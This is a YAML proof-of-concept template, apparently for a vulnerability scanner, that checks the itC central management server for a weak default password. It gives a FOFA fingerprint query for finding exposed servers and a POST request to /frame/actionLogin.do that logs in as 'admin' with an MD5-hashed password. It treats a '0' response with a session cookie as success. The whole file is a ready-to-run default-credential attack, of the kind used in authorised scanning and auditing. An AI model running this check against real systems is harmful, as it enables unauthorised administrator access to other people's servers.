id: poc-yaml-itc-cms-weak-password
info:
  name: itC 中心管理服务器 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: itC 中心管理服务器
  fofa: body="/mt_res_v3/img/public/logo.ico"
firstRequest:
  method: GET
  path: /
  expression: status_code == 200 && contains(body,"/mt_res_v3/img/public/logo.ico")
requests:
- method: POST
  path: /frame/actionLogin.do
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: account=admin&password=21232f297a57a5a743894a0e4a801fc3&language=zh_CN
  expression: status_code == 200 && body == "0" && contains(headers,"JSESSIONID=")
variables: {}
transport: http
